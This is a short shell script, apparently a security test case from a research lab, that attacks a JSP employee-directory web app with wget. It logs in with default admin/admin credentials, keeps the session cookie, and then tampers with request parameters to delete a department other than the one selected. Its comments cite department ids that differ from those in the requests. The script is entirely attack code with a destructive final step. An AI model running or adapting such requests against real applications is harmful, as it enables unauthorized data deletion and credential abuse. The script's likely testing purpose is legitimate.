#!/bin/sh

#get the login page
wget -a log.txt --keep-session-cookies --save-cookies cookies.txt "http://calculus.sisl.rites.uic.edu:443/5f3decd5/empldir/empldirFix/Login.jsp"

#enter login credentials
wget -a log.txt --load-cookies cookies.txt --post-data 'FormName=Login&Login=admin&Password=admin&FormAction=login' "http://calculus.sisl.rites.uic.edu:443/5f3decd5/empldir/empldirFix/Login.jsp"

#Select a particular department(dep_id=13)
wget -a log.txt --load-cookies cookies.txt "http://calculus.sisl.rites.uic.edu:443/5f3decd5/empldir/empldirFix/DepsRecord.jsp?dep_id=23"

#Send request to delete dep_id=10 even though the selected department is dep_id=13
wget -a log.txt --load-cookies cookies.txt "http://calculus.sisl.rites.uic.edu:443/5f3decd5/empldir/empldirFix/DepsRecord.jsp?name=HackerDept&FormName=deps&FormAction=delete&dep_id=22&PK_dep_id=22"

